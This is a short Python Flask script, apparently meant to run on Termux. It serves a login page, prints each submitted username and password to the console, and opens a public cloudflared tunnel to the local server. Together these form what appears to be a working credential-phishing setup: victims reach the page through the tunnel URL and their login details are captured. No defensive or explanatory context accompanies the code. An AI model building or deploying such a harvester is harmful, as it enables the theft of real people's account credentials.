import os
from flask import Flask, render_template, request, send_from_directory

app = Flask(__name__)

# Route to serve the index.html file
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Get the username and password from the form
        username = request.form['username']
        password = request.form['password']

        # Print the username and password to the Termux screen
        print(f"Username: {username}, Password: {password}")

    return render_template('index.html')

# Route to serve the CSS file
@app.route('/static/style.css')
def css():
    return send_from_directory('static', 'style.css')

# Route to serve the image
@app.route('/static/images (17).jpeg')
def image():
    return send_from_directory('static', 'images (17).jpeg')

if __name__ == '__main__':
    # Start the Flask server
    print("Starting Flask server...")
    os.system("cloudflared tunnel --url http://localhost:8080 &")
    app.run(host='0.0.0.0', port=8080)
